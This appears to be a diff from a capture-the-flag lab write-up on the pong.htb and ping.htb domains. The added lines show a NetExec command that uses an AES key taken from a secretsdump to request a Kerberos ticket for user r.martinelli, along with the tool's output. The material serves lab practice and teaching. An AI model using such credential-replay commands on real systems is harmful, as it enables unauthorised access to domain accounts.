@@ -1192,5 +1192,15 @@ Ill also dump all the secrets from `dc2`
 
 Looking through the users in the `pong.htb` domain i something interesting, he is a member of the CA managers in `ping.htb`
 
+```python
+faketime -f +8h nxc smb dc2.pong.htb -u 'r.martinelli' --aesKey '61e48d17cfe9507a3095dfb84b218a4b803aa0984b123e432bc2a40fc5f7fe98' --generate-tgt r.martinelli
+SMB         dc2.pong.htb    445    dc2              [*]  x64 (name:dc2) (domain:pong.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
+SMB         dc2.pong.htb    445    dc2              [+] pong.htb\r.martinelli:61e48d17cfe9507a3095dfb84b218a4b803aa0984b123e432bc2a40fc5f7fe98 
+SMB         dc2.pong.htb    445    dc2              [+] TGT saved to: r.martinelli.ccache
+SMB         dc2.pong.htb    445    dc2              [+] Run the following command to use the TGT: export KRB5CCNAME=r.martinelli.ccache
+```
+
+Ill use the secretdump output to get the aes key of `r.martinelli` to get a TGT
+
 
 
